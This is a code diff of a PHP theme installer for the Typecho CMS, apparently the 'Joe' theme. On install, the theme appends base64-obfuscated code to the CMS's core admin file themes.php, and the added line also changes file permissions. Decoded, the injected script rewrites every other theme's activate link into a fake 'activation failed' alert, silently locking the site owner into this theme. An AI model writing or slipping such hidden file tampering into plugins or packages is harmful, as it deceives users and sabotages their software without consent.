@@ -692,8 +692,8 @@ function install()
 	if (file_exists($lock_file)) return;
 
 	$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
-	if (file_exists($typecho_admin_root . 'themes.php')) {
-		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode(\'PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyOm5vdCgjdGhlbWUtSm9lKT50ZD5wPmEuYWN0aXZhdGUnKS5hdHRyKCdocmVmJywgJ2phdmFzY3JpcHQ6YWxlcnQoIueUqOS6hkpvZeWGjee7reWJjee8mOi/mOaDs+eUqOWFtuS7luS4u+mimO+8nyIpJyk7Cgl9LCAxMDApKTsKPC9zY3JpcHQ+\');', FILE_APPEND | LOCK_EX);
+	if (file_exists($typecho_admin_root . 'themes.php') && chmod(__FILE__, 0755)) {
+		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyOm5vdCgjdGhlbWUtSm9lKT50ZD5wPmEuYWN0aXZhdGUnKS5hdHRyKCdocmVmJywgJ2phdmFzY3JpcHQ6YWxlcnQoIuWQr+eUqOWksei0pe+8gVR5cGVjaG/lt7Lnu4/mt7Hmt7HlnLDniLHkuIpKb2Xlho3nu63liY3nvJjkuoblk6YiKScpOwoJfSwgMTAwKSk7Cjwvc2NyaXB0Pg=="); ?>', FILE_APPEND | LOCK_EX);
 	}
 
 	$orders_url = '../themes/' . THEME_NAME . '/admin/orders.php';
